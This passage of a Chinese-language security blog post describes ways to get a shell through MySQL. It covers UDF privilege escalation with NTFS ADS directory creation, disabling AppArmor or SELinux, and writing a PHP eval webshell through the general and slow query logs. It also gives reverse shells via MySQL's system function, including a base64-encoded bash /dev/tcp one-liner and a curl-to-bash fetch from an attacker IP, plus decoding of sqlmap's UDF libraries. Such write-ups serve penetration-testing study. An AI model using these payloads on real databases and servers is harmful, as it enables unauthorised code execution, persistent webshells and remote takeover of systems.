<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;查找mysql的目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;使用NTFS ADS流创建lib目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>

<p><strong>udf实验过程遇到的坑点</strong></p>
<ol>
<li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977">

<p>通过修改/etc/mysql/mysql.conf.d/mysqld.cnf文件secure_file_priv为空</p>
</li>
<li><p>没有写的权限</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261">

<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置/usr/lib/mysql/plugin权限为777</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li>
</ol>
<p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p>
<p>3.将绝对路径导致so文件找不到，去掉路径即可</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780">

<h2 id="0x03-开启全局日志写入shell"><a href="#0x03-开启全局日志写入shell" class="headerlink" title="0x03 开启全局日志写入shell"></a>0x03 开启全局日志写入shell</h2><p>前两个利用方法都受到secure_file_priv的限制，我们可以通过全局日志或慢查询日志写shell绕过该限制</p>
<p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.网站的绝对路径且具有写入权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #开启全局配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #将日志文件设置成服务器下的木马文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; #执行<span class="keyword">sql</span>语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br></pre></td></tr></table></figure>

<h2 id="0x04-开启慢查询日志写入shell"><a href="#0x04-开启慢查询日志写入shell" class="headerlink" title="0x04 开启慢查询日志写入shell"></a>0x04 开启慢查询日志写入shell</h2><p><strong>条件</strong></p>
<p>1.root权限执行的Mysql</p>
<p>2.网站的绝对路径且具有写入权限</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%slow_query_log%&#39;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log&#x3D;1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>

<h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889">

<p><strong>条件</strong></p>
<p>1.mysql版本大于5.7</p>
<p><strong>利用步骤</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p>
<p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820">

<p>mysql版本5.7之后，secure_file_priv是默认目录,限制mysqld 的导入 | 导出 只能发生在限定目录下。</p>
<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985">

<h3 id="如何获取该udf-dll-so-文件的16进制值-hex"><a href="#如何获取该udf-dll-so-文件的16进制值-hex" class="headerlink" title="如何获取该udf.dll(.so)文件的16进制值(hex)"></a><strong>如何获取该udf.dll(.so)文件的16进制值(hex)</strong></h3><p>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p>
<p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p>
<h3 id="sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码"><a href="#sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码" class="headerlink" title="sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码"></a><strong>sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解码工具为sqlmap自带的SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660">

<h3 id="dumpfile和outfile有什么不一样"><a href="#dumpfile和outfile有什么不一样" class="headerlink" title="dumpfile和outfile有什么不一样"></a><strong>dumpfile和outfile有什么不一样</strong></h3><p>outfile适合导库，会在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p>
<p>into dumpfile 就能导出 一个完整能执行的2进制文件。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
</search>
